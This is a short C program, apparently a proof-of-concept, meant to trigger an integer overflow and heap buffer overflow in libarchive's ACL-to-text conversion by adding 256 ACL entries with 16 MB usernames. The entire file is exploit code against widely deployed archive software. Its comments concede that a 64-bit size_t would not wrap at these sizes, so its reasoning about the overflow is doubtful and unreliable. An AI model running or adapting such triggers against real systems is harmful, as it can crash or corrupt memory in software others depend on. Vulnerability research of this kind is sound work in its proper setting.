#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

int main(void) {
    struct archive_entry *entry;
    char *text;
    ssize_t text_len;
    int flags = ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID;
    
    entry = archive_entry_new();
    if (!entry) {
        fprintf(stderr, "Failed to create entry\n");
        return 1;
    }
    
    /* Create a very long username that will cause length overflow
     * when converted to wide characters and accumulated in archive_acl_text_len.
     * We need the length calculation to overflow size_t and wrap around to a small value.
     * 
     * Each ACL entry adds:
     * - base overhead (tag name, colons, perms, etc): ~50 bytes
     * - username length
     * - numeric ID if EXTRA_ID flag set: ~10 bytes
     * 
     * To overflow size_t (on 64-bit: 2^64-1), we need massive strings.
     * However, a more practical overflow is when the length calculation wraps
     * due to repeated additions of very large values.
     * 
     * Let's create multiple ACL entries with extremely long usernames.
     * Each username will be several megabytes, and we'll add many entries.
     */
    
    size_t username_len = 16 * 1024 * 1024; /* 16 MB username */
    char *long_username = malloc(username_len + 1);
    if (!long_username) {
        fprintf(stderr, "Failed to allocate username\n");
        archive_entry_free(entry);
        return 1;
    }
    
    /* Fill with valid UTF-8 characters (ASCII 'a' for simplicity) */
    memset(long_username, 'a', username_len);
    long_username[username_len] = '\0';
    
    /* Add multiple ACL entries with this extremely long username
     * The goal is to make archive_acl_text_len overflow when it sums up:
     * length += len (where len is the username length)
     * 
     * With enough entries, the cumulative length will overflow size_t
     */
    
    int num_entries = 256; /* Add many entries to amplify the overflow */
    
    for (int i = 0; i < num_entries; i++) {
        /* Add user ACL entry with extremely long username */
        archive_entry_acl_add_entry(entry,
            ARCHIVE_ENTRY_ACL_TYPE_ACCESS,  /* type */
            ARCHIVE_ENTRY_ACL_READ,          /* permset */
            ARCHIVE_ENTRY_ACL_USER,          /* tag */
            i,                                /* qual (user id) */
            long_username);                   /* name */
    }
    
    /* Now call archive_entry_acl_to_text which internally calls archive_acl_text_len
     * If the length calculation overflows, it will return a small value,
     * causing malloc to allocate a small buffer, then the text generation
     * will overflow that buffer.
     */
    text = archive_entry_acl_to_text(entry, &text_len, flags);
    
    if (text) {
        /* If we got here, the overflow might have occurred during text generation */
        printf("Generated ACL text of length: %zd\n", text_len);
        free(text);
    } else {
        printf("archive_entry_acl_to_text returned NULL\n");
    }
    
    free(long_username);
    archive_entry_free(entry);
    
    return 0;
}